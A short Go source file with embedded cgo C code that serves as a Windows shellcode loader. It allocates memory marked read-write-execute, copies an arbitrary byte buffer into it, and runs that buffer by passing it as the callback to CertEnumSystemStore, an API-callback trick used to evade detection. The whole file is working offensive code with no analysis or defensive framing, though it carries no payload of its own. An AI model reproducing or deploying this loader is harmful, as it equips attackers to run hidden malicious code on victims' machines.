package cloader

/*
#cgo LDFLAGS: -lcrypt32
#include <windows.h>
#include <wincrypt.h>

void certEnumSystemStore(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, 0, 0, (PFN_CERT_ENUM_SYSTEM_STORE)addr);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func CertEnumSystemStore(p []byte) {
	C.certEnumSystemStore((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
